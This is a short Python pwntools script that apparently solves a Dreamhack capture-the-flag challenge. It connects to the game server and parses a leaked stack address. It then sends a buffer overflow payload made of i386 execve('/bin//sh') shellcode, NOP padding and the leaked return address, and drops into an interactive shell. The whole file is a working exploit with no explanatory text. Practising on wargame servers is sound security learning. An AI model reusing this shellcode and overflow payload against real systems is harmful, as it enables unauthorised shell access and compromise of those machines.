from pwn import *

context.arch = "i386"
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 22315)

#shell = shellcraft.sh()
#shellcode = asm(shell)

shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'


data = p.recvline()

hex_data = data[7:-2]

print(hex_data)
#print(data)
hex_data = int(hex_data, 16)
#p_data = p32(hex_data)
payload = shellcode + b"\x90" * (0x80 - len(shellcode)) + b"\x90" * 4 + p32(hex_data)

#Check p32(hex)
print(f"p32(hex_data) : {p32(hex_data)}")

#print(f"p_data : {p_data}")
print(f"payload : {payload}")
p.sendline(payload)

#p.recvline()

p.interactive()


